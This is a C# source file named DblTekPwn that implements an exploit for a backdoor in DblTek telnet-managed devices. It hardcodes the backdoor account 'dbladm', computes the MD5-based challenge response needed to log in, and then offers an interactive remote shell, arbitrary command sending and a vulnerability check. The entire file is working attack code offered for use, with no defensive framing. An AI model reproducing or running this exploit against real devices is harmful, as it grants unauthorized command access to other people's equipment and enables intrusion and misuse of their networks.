﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace DblTekPwn
{
    public class DblTekPwn
    {
        public static string BACKDOOR_ACCOUNT = "dbladm";

        public static string ComputeResponse(int challenge)
        {
            string modified = (challenge + 20139 + (challenge >> 3)).ToString();

            byte[] buffer = new byte[64];

            for (int i = 0; i < modified.Length; i++)
                buffer[i] = (byte)modified[i];

            MD5 md5 = MD5.Create();
            byte[] hash = md5.ComputeHash(buffer);

            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < 6; i++)
                sb.Append(hash[i].ToString("X"));

            return sb.ToString().ToLower();
        }

        private string ip;
        private int port;

        public DblTekPwn(string ip, int port = 23)
        {
            this.ip = ip;
            this.port = port;
        }

        public void Shell()
        {
            Thread outputThread = null;
            try
            {
                TelnetClient client = new TelnetClient(ip, port);
                outputThread = new Thread(() => shellOutputThread(client));
                client.Write(BACKDOOR_ACCOUNT);

                for (int i = 0; i < 5; i++)
                    client.Read();

                string challengeLine = client.Read();
                string response = ComputeResponse(Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1)));
                client.Write(response);

                outputThread.Start();
                while (true)
                {
                    client.Write(Console.ReadLine());
                    skipNextLine = true;
                }
            }
            catch
            {

            }
            finally
            {
                try
                {
                    outputThread.Abort();
                }
                catch
                {

                }
            }
        }

        private bool skipNextLine = false;
        private void shellOutputThread(TelnetClient client)
        {
            while (true)
            {
                string line = client.Read();
                if (skipNextLine)
                    skipNextLine = false;
                else
                    Console.WriteLine(line);
            }
        }

        public bool SendCommands(params string[] commands)
        {
            try
            {
                TelnetClient client = new TelnetClient(ip, port);
                client.Write(BACKDOOR_ACCOUNT);

                for (int i = 0; i < 5; i++)
                    client.Read();

                string challengeLine = client.Read();
                string response = ComputeResponse(Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1)));
                client.Write(response);

                foreach (string command in commands)
                    client.Write(command);
                Thread.Sleep(2000);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool TestLogin()
        {
            try
            {
                TelnetClient client = new TelnetClient(ip, port);
                client.Write(BACKDOOR_ACCOUNT);

                for (int i = 0; i < 5; i++)
                    client.Read();

                return client.Read().StartsWith("challenge: N");
            }
            catch
            {
                return false;
            }
        }
    }
}
